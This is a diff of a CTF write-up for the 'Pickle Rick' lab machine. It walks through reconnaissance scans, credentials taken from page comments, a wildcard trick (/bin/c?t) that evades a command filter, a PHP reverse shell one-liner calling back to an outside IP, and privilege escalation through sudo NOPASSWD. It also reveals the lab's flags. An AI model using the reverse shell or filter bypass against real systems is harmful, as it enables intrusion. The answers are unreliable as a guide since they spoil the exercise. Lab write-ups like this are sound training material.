@@ -8,11 +8,11 @@ Let's begin.
 ## Website
 
 * In source code there is this comment:
-""
+"
     Note to self, remember username!
 
     Username: R1ckRul3s
-""
+  "
 
 * run nmap command:
 ```
@@ -54,8 +54,10 @@ nikto -h 10.10.38.165
 ```
 gobuster -w /usr/share/wordlists/directory-list-2.3-small.txt -u http://10.10.38.165/ -t 20 -x php
 ```
+
 result:
-*=====================================================
+
+=====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
 [+] Mode         : dir
@@ -70,9 +72,12 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 =====================================================
 /login.php (Status: 200)
 /assets (Status: 301)
-/portal.php (Status: 302)*
+/portal.php (Status: 302)
 
-* go to *login.php* (img3) and use credetials R1ckRul3s:Wubbalubbadubdub
+
+* go to *login.php* and use credetials R1ckRul3s:Wubbalubbadubdub
+
+![img3](/images/pickle_rick-thm/img3.png?raw=true)
 
 ## First ingredient
 
@@ -86,9 +91,15 @@ login.php
 portal.php
 robots.txt
 
-* we need to cat Sup3rS3cretPickl3Ingred.txt file but a filter is placed (img4)
+* we need to cat Sup3rS3cretPickl3Ingred.txt file but a filter is placed
 
-* bypass it using the following command (img5):
+![img4](/images/pickle_rick-thm/img4.png?raw=true)
+
+
+* bypass it using the following command
+
+![img5](/images/pickle_rick-thm/img5.png?raw=true):
+
 ```
 /bin/c?t Sup3rS3cretPickl3Ingred.txt
 ```
@@ -108,7 +119,10 @@ first flag found: mr. meeseek hair
 
 ## Third ingredient
 
-* rev shell using php (img6):
+* rev shell using php
+
+![img6](/images/pickle_rick-thm/img6.png?raw=true):
+
 ```
 php -r '$sock=fsockopen("10.8.12.35",1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 ```
@@ -127,8 +141,10 @@ User www-data may run the following commands on
         ip-10-10-100-151.eu-west-1.compute.internal:
     (ALL) NOPASSWD: ALL
 ```
-so all the commands can be run by www-data (?)
+so all the commands can be run by www-data
 
-* then, (img8)
+* then:
+
+![img8](/images/pickle_rick-thm/img8.png?raw=true)
 
 3rd ingredient: fleeb juice
